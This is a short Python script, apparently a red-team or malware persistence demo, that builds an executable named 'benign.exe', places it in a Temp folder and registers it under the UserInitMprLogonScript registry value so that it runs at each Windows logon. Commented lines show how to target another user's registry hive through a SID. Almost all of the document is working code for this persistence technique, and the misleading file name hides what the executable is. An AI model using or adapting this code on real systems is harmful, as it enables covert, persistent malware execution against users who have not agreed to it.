# Logon script

import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)

if os.path.isfile(filepath):
        os.remove(filepath)

# Use buildexe to create executable
os.system("python buildexe.py")

# Move executable to desired directory
shutil.move(filename,filedir)

# Windows logon script keys
reghive = winreg.HKEY_CURRENT_USER
regpath = "Environment"

# The SIDs can be found in regedit HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
# The corresponding username in ProfileImagePath
#reghive = winreg.HKEY_USERS
#regpath = "S-1-5-21-524849353-310586374-791561826-1002\Environment"

# Add registry logon script
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,filepath)
